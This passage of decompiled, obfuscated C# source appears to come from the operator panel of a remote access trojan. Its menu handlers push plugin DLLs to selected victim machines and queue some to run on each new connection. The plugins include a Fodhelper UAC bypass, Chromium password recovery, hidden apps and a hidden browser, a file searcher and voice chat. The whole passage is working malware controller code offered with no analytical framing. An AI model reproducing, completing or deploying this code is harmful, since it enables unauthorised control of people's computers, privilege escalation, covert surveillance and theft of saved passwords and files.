		gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
	}

	private void UninstallPluginsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		byte[] array = Module0.smethod_6("RemovePlugins");
		_Closure_0024__R880_002D154 closure_0024__R880_002D = default(_Closure_0024__R880_002D154);
		foreach (GClass5 item in (IEnumerable)method_0())
		{
			closure_0024__R880_002D = new _Closure_0024__R880_002D154(closure_0024__R880_002D);
			closure_0024__R880_002D._0024VB_0024NonLocal_2 = item;
			ThreadPool.QueueUserWorkItem(closure_0024__R880_002D._Lambda_0024__R156, array);
		}
	}

	private void RunRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Recovery.dll"));
			_Closure_0024__R881_002D156 closure_0024__R881_002D = default(_Closure_0024__R881_002D156);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R881_002D = new _Closure_0024__R881_002D156(closure_0024__R881_002D);
				closure_0024__R881_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R881_002D._Lambda_0024__R158, array);
			}
			Module0.smethod_3("RunRecovery..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RunRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (Lv3.Items.Count > 0)
			{
				foreach (ListViewItem item in Lv3.Items)
				{
					if (Operators.CompareString(item.Text, "RunRecovery", TextCompare: false) == 0)
					{
						return;
					}
				}
			}
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "RunRecovery";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			byte[] msgPack = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Recovery.dll"));
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\UACBypass.dll") + GClass19.string_0 + "1");
			_Closure_0024__R883_002D158 closure_0024__R883_002D = default(_Closure_0024__R883_002D158);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R883_002D = new _Closure_0024__R883_002D158(closure_0024__R883_002D);
				closure_0024__R883_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R883_002D._Lambda_0024__R160, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void HiddenVNCToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void HiddenAppsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\HiddenApps.dll"));
			_Closure_0024__R885_002D160 closure_0024__R885_002D = default(_Closure_0024__R885_002D160);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R885_002D = new _Closure_0024__R885_002D160(closure_0024__R885_002D);
				closure_0024__R885_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R885_002D._Lambda_0024__R162, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void HiddenBrowserToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\HBrowser.dll"));
			_Closure_0024__R886_002D162 closure_0024__R886_002D = default(_Closure_0024__R886_002D162);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R886_002D = new _Closure_0024__R886_002D162(closure_0024__R886_002D);
				closure_0024__R886_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R886_002D._Lambda_0024__R164, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ChromiumToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Chromium.dll"));
			_Closure_0024__R887_002D164 closure_0024__R887_002D = default(_Closure_0024__R887_002D164);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R887_002D = new _Closure_0024__R887_002D164(closure_0024__R887_002D);
				closure_0024__R887_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R887_002D._Lambda_0024__R166, array);
			}
			Module0.smethod_3("Chromium Passwords..", Color.Black);
			method_1();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void ChromiumToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (Lv3.Items.Count > 0)
			{
				foreach (ListViewItem item in Lv3.Items)
				{
					if (Operators.CompareString(item.Text, "Chromium", TextCompare: false) == 0)
					{
						return;
					}
				}
			}
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "Chromium";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			Lv3.Items.Add(listViewItem);
			Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			byte[] msgPack = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\Chromium.dll"));
			gclass9s_0.Add(new GClass9(msgPack, listViewItem.ToolTipText));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void FilesSearcherToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\FilesSearcher.dll"));
			_Closure_0024__R889_002D166 closure_0024__R889_002D = default(_Closure_0024__R889_002D166);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R889_002D = new _Closure_0024__R889_002D166(closure_0024__R889_002D);
				closure_0024__R889_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R889_002D._Lambda_0024__R168, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void VoiceChatToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (Lv1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			byte[] array = Module0.smethod_6("plugin" + GClass19.string_0 + Module0.smethod_10("Plugins\\VoiceChat.dll"));
			_Closure_0024__R890_002D168 closure_0024__R890_002D = default(_Closure_0024__R890_002D168);
			foreach (GClass5 item in (IEnumerable)method_0())
			{
				closure_0024__R890_002D = new _Closure_0024__R890_002D168(closure_0024__R890_002D);
				closure_0024__R890_002D._0024VB_0024NonLocal_2 = item;
				ThreadPool.QueueUserWorkItem(closure_0024__R890_002D._Lambda_0024__R170, array);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}
}


